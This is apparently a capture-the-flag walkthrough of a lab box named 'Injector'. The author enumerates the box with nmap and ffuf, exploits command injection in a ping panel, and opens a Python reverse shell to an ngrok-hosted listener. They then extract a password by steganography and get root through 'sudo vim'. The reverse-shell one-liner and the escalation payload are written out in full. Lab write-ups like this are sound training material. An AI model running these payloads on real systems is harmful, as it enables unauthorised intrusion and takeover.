Enumeration With Nmap

```
# Nmap 7.92 scan initiated Mon Oct 10 03:12:41 2022 as: nmap -sC -sV -T4 -oN quickmap.txt -Pn 35.157.97.32
Warning: 35.157.97.32 giving up on port because retransmission cap hit (6).
Nmap scan report for 35.157.97.32
Host is up (0.15s latency).
Not shown: 953 closed tcp ports (conn-refused), 45 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7d:95:ce:f8:06:3c:9f:cd:3d:24:5d:fa:cd:4d:0e:60 (RSA)
|   256 6a:f4:e8:f3:54:24:e3:34:e5:0a:83:e2:29:75:7b:f2 (ECDSA)
|_  256 f4:5e:7f:0c:2e:41:8a:bc:df:3b:09:cc:e5:28:40:db (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: BY_VECTORS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 10 03:14:00 2022 -- 1 IP address (1 host up) scanned in 78.75 seconds
```

Cool we have http and ssh ports open, let's enumerate port 80 first 

![image](https://user-images.githubusercontent.com/87468669/194824965-d5961658-79eb-41eb-9236-0981c06b80cc.png)

Seems some dumb team left a spoiler😤, let's just ignore them 😤... Let's burst for hidden directories 

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/Documents/CyberTalent/Injector]
└─$ ffuf -u "http://35.157.97.32/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.bak -fs 277

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://35.157.97.32/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .php .txt .bak 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 277
________________________________________________

                        [Status: 200, Size: 271, Words: 86, Lines: 15, Duration: 162ms]
index.html              [Status: 200, Size: 271, Words: 86, Lines: 15, Duration: 153ms]
secret                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 153ms]
:: Progress: [18456/18456] :: Job [1/1] :: 233 req/sec :: Duration: [0:01:28] :: Errors: 0 ::

```

great we got a directory /secret, let's check the path

![image](https://user-images.githubusercontent.com/87468669/194825949-f3e339d6-c07b-4405-b310-33642fe611ed.png)

Let's check the page source 

![image](https://user-images.githubusercontent.com/87468669/194826256-9e8e3d87-d849-4f68-997a-ed1c9ee0f562.png)

Got nothing in the source page, let's burst for hidden directories 

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/Documents/CyberTalent/Injector]
└─$ ffuf -u "http://35.157.97.32/secret/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.bak -fs 277

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://35.157.97.32/secret/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .php .txt .bak 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 277
________________________________________________

                        [Status: 200, Size: 445, Words: 85, Lines: 20, Duration: 4897ms]
company                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 144ms]
index.html              [Status: 200, Size: 445, Words: 85, Lines: 20, Duration: 149ms]
robots.txt              [Status: 200, Size: 25, Words: 3, Lines: 3, Duration: 146ms]
robots.txt              [Status: 200, Size: 25, Words: 3, Lines: 3, Duration: 154ms]
root                    [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 155ms]
test                    [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 150ms]
tools                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 161ms]
:: Progress: [18456/18456] :: Job [1/1] :: 258 req/sec :: Duration: [0:01:16] :: Errors: 0 ::

```

checked out the directories they were all TROLL except tools, so let's check the path /tools

![image](https://user-images.githubusercontent.com/87468669/194827888-659301ab-1a4e-49c0-9f8f-3acd6167dd23.png)

got some files... there should be interesting let's check out ping.php file 

![image](https://user-images.githubusercontent.com/87468669/194828117-b613f1fe-a9f3-4989-9ce8-57b77cc41e21.png)

nice we have a ping panel,let's add an IP address to it and see what it those 

![image](https://user-images.githubusercontent.com/87468669/194828323-67ca3397-2b0c-4d47-9e80-6e8c46acc0d1.png)

great we can ping an IP address, why don't we try out command injection into the panel 

![image](https://user-images.githubusercontent.com/87468669/194828798-1c9ba065-635c-4543-b103-1980d9d46105.png)

Sweeeet we got command injection let's create a reverse shell using ngrok 

![image](https://user-images.githubusercontent.com/87468669/194829063-29e3d785-dce7-407d-896e-e3e9da1e00cd.png)

ping our ngrok address to get an IP address 

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/Documents/CyberTalent/Injector]
└─$ ping -c 2 2.tcp.eu.ngrok.io
PING 2.tcp.eu.ngrok.io (18.157.68.73) 56(84) bytes of data.
64 bytes from 18.157.68.73 (18.157.68.73): icmp_seq=1 ttl=234 time=139 ms
64 bytes from 18.157.68.73 (18.157.68.73): icmp_seq=2 ttl=234 time=135 ms

--- 2.tcp.eu.ngrok.io ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 135.051/137.054/139.058/2.003 ms

```

Ncat listener ready

![image](https://user-images.githubusercontent.com/87468669/194829450-62a960ae-4987-4eab-b2bd-c87f6f0cc1b6.png)

Reverse Shell payload ready

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("18.157.68.73",13705));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

![image](https://user-images.githubusercontent.com/87468669/194829773-776b1594-a983-479c-b236-b4feb75bcc6b.png)

Checking our ncat listener and we got shell

![image](https://user-images.githubusercontent.com/87468669/194829914-90bd5c88-9d0a-4d01-82d4-785d222a61ae.png)

let’s stabilize the shell.

![image](https://user-images.githubusercontent.com/87468669/194830176-509e17b2-4afb-4d4c-b51c-c81105c4c628.png)

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo;fg
export TERM=xterm
```

We got a stable shell, let's escalate privs. checking the /var/www directory, saw a sus image 🤔 🤔.

![image](https://user-images.githubusercontent.com/87468669/194831068-eb178a1a-83d6-4255-9f6c-9f4776c2ae7b.png)

let's try download the image into our attacker machine... In the target machine start a python http server and download the image into the attacker with wget.

![image](https://user-images.githubusercontent.com/87468669/194831540-b414615f-17f6-411d-bd45-bb961f7bebee.png)

let's download the file.

![image](https://user-images.githubusercontent.com/87468669/194831840-557d0e53-1686-45f2-81a5-53b2ac83d265.png)

now we have downloaded the image let's use steghide to extract the content of the image.

![image](https://user-images.githubusercontent.com/87468669/194832121-306c6ee0-98fd-4d31-bca0-96d5fbeaa99f.png)

nice we got a password, let's go back and check for the users available on the target by just doing `cat /etc/passwd`

![image](https://user-images.githubusercontent.com/87468669/194833518-ba648ac3-1c16-4de1-91ab-3aeed703673f.png)

now we got a user alex, let's try su with username: alex and password:D0n41dTrump

![image](https://user-images.githubusercontent.com/87468669/194834208-ef8b8dc2-d495-433c-a61a-eefa56e537ad.png)

We are in as user alex, let's escalat privilege to root, by just running `sudo -l`

![image](https://user-images.githubusercontent.com/87468669/194834611-5f3a4897-880c-4409-a18f-b1dfdc560d02.png)

```
alex@ip-172-31-29-253:/home$ sudo -l
Matching Defaults entries for alex on ip-172-31-29-253:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ip-172-31-29-253:
    (ALL) NOPASSWD: /usr/bin/vim
alex@ip-172-31-29-253:/home$ 
alex@ip-172-31-29-253:/home$ 
```

checking gtfobins for abusing vuln binary for /usr/bin/vim

![image](https://user-images.githubusercontent.com/87468669/194834955-768dfba8-0d2e-4143-bb76-1b0c5afa86b4.png)

using the payload `sudo vim -c ':!/bin/sh'` got us root

![image](https://user-images.githubusercontent.com/87468669/194835604-eb24a97b-27f9-4699-87c1-842044905d0b.png)

we are root!! Hope you had fun😅
